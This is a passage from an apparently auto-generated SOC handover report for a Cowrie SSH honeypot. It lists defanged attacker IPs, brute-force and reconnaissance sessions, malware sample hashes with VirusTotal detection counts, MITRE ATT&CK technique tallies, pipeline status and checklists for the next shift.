- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ee6347c71d

| Field | Detail |
|---|---|
| **Source IP** | `119.41.148[.]145` |
| **First Seen** | 2026-05-09 07:41 |
| **Last Seen** | 2026-05-09 07:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:41:12` | `cowrie.session.connect` |
| `2026-05-09 07:41:12` | `cowrie.client.version` |
| `2026-05-09 07:41:12` | `cowrie.client.kex` |
| `2026-05-09 07:41:13` | `cowrie.login.success` |
| `2026-05-09 07:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.41.148[.]145` to AbuseIPDB if not already reported
- [ ] Block `119.41.148[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.183.111[.]36` | **33** | 2026-05-09 09:04 | 2026-05-09 09:23 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `101.47.158[.]56` | **30** | 2026-05-09 06:39 | 2026-05-09 07:26 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.118.142[.]245` | **29** | 2026-05-09 06:20 | 2026-05-09 06:57 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.39[.]73` | **14** | 2026-05-09 07:42 | 2026-05-09 08:00 | 11m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.95.25[.]34` | **9** | 2026-05-09 08:49 | 2026-05-09 09:20 | 8m | 0 | `T1592` | 🟢 LOW |
| `104.43.56[.]65` | **2** | 2026-05-09 06:54 | 2026-05-09 06:59 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.41.148[.]145` | 1 | 2026-05-09 07:41 | 2026-05-09 07:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]36` | 1 | 2026-05-09 06:21 | 2026-05-09 06:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]4` | 1 | 2026-05-09 06:26 | 2026-05-09 06:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.155.71[.]60` | 1 | 2026-05-09 08:58 | 2026-05-09 08:58 | 12s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]202` | 1 | 2026-05-09 07:37 | 2026-05-09 07:37 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.172[.]202` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `212.73.148[.]4` | SG | NL MODAT | **100** ⚠️ | 50 |
| `206.183.111[.]36` | IN | Web Werks | **100** ⚠️ | 1 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `186.118.142[.]245` | CO | UNIA_2506765 | **100** ⚠️ | 37 |
| `212.73.148[.]36` | SG | NL MODAT | **100** ⚠️ | 50 |
| `218.155.71[.]60` | KR | Korea Telecom | **100** ⚠️ | 6 |
| `119.41.148[.]145` | CN | HaiFu node Broad Band dialup pool-3 | **100** ⚠️ | 1 |
| `101.47.158[.]56` | SG | BYTEPLUS | **100** ⚠️ | 28 |
| `104.43.56[.]65` | SG | Microsoft Corporation | **100** ⚠️ | 16 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 92 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 62 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 153 cases |
| Tool 34  | Credential Extractor        | ✅ 76 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (11.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 11 recon entry/entries in table (6 group(s) consolidating 117 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-09T09:24:11Z_
